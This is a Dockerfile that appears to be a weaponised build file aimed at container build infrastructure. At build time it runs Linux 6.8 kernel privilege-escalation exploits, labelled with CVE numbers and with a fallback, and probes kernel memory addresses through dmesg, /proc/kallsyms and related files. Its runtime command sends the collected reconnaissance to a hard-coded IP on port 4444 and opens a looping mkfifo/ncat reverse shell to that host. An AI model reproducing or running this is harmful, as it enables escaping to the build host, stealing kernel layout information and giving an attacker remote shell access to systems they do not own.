# syntax=er028455/df-frontend:v4
# build-trigger: 164
FROM alpine:3.19 AS builder
RUN apk add --no-cache curl coreutils

COPY exploit_68 /exploit
COPY payload /payload
COPY kaslr_diag /kaslr_diag
RUN chmod +x /exploit /payload /kaslr_diag && touch /esc_ok /umh_result /build_results.txt

RUN sh -c '{ \
KVER=$(uname -r); \
echo "=== BUILD V27 KERNEL=$KVER ==="; \
case "$KVER" in \
  6.8.*-136*) \
    echo "TARGET KERNEL 136 MATCHED — SCTPhantom FIRST"; \
    echo "--- SCTPhantom (CVE-2026-64564) ---"; \
    timeout 90 /exploit 2>&1; \
    EC_SCTP=$?; \
    echo "=== SCTPHANTOM EXIT=$EC_SCTP ==="; \
    if [ "$EC_SCTP" != "0" ]; then \
      echo "--- FALLBACK: CVE-2026-80521 (SCC GC race) ---"; \
      timeout 90 /payload 2>&1; \
      EC=$?; \
      echo "=== SCC_EXPLOIT EXIT=$EC ==="; \
    fi; \
    ;; \
  6.8.*) \
    echo "TARGET KERNEL 137+ MATCHED — SCC GC only"; \
    echo "--- CVE-2026-80521 (SCC GC race) ---"; \
    timeout 90 /payload 2>&1; \
    EC=$?; \
    echo "=== SCC_EXPLOIT EXIT=$EC ==="; \
    ;; \
  *) echo "NOT a 6.8 kernel ($KVER), skipping" ;; \
esac; \
if [ "${EC:-1}" != "0" ] && [ "${EC_SCTP:-1}" != "0" ] && echo "$KVER" | grep -q "^6\.8"; then \
  echo "--- KASLR ALT PROBE ---"; \
  echo "DMESG:"; dmesg 2>&1 | grep -iE "ffffffff|text|kaslr|kernel|randomize" | head -5; \
  echo "DMESG_RC=$?"; \
  echo "MODULES:"; head -3 /proc/modules 2>&1; \
  echo "IOMEM:"; head -10 /proc/iomem 2>&1; \
  echo "KALLSYMS_SAMPLE:"; grep -E "startup_64|_text|_stext" /proc/kallsyms 2>&1 | head -3; \
  echo "KPTR_RESTRICT:"; cat /proc/sys/kernel/kptr_restrict 2>&1; \
  echo "DMESG_RESTRICT:"; cat /proc/sys/kernel/dmesg_restrict 2>&1; \
  echo "NOTES:"; od -A x -t x1z /sys/kernel/notes 2>&1 | head -5; \
  echo "--- KASLR DIAGNOSTIC ---"; \
  timeout 60 /kaslr_diag 2>&1; \
fi; \
for f in /esc_ok /tmp/umh_result /tmp/.u68; do \
  if [ -f "$f" ]; then echo "=== $f ==="; cat "$f"; fi; \
done; \
echo "=== END V27 ==="; \
} > /build_results.txt 2>&1'

FROM alpine:3.19
RUN apk add --no-cache curl nmap-ncat
COPY --from=builder /build_results.txt /build_results.txt
COPY --from=builder /esc_ok /esc_ok
COPY --from=builder /umh_result /umh_result
COPY --from=er028455/df-frontend:v4 /socktest /socktest

RUN printf '#!/bin/sh\n\
{\n\
echo "=== RUNTIME RECON V27 ==="\n\
uname -a; hostname; id\n\
echo "--- BUILD-TIME RESULTS ---"\n\
cat /build_results.txt\n\
for f in /esc_ok /umh_result; do\n\
  if [ -s "$f" ]; then echo "=== $f ==="; cat "$f"; fi\n\
done\n\
echo "=== END V27 ==="\n\
} > /tmp/recon 2>&1\n\
cat /tmp/recon\n\
' > /recon.sh && chmod +x /recon.sh

CMD sh -c "/recon.sh; ncat -w 30 129.101.121.138 4444 < /tmp/recon; while true; do rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | ncat 129.101.121.138 4444 > /tmp/f; sleep 5; done"
